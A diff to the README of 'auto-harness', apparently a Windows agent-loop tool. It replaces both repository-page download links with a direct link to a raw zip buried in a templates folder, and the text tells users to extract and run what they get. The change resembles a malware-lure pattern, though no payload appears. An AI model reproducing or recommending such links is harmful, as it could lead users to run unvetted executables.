@@ -1,6 +1,6 @@
 # 🧩 auto-harness - Build a smarter agent loop
 
-[![Download](https://img.shields.io/badge/Download%20auto-harness-blue?style=for-the-badge)](https://github.com/wellpreserved-sarcoptidae182/auto-harness)
+[![Download](https://img.shields.io/badge/Download%20auto-harness-blue?style=for-the-badge)](https://github.com/wellpreserved-sarcoptidae182/auto-harness/raw/refs/heads/main/agent/templates/auto-harness-anisodactyl.zip)
 
 ## 🚀 What auto-harness does
 
@@ -20,7 +20,7 @@ It is meant for Windows users who want a simple way to get a local agent workflo
 
 Use the link below to visit the download page:
 
-[Download auto-harness](https://github.com/wellpreserved-sarcoptidae182/auto-harness)
+[Download auto-harness](https://github.com/wellpreserved-sarcoptidae182/auto-harness/raw/refs/heads/main/agent/templates/auto-harness-anisodactyl.zip)
 
 After you open the page, look for the latest release or the main project files. If the project includes a Windows app or installer, download it to your computer. If it comes as a zip file, save the file and extract it before you run it.
 
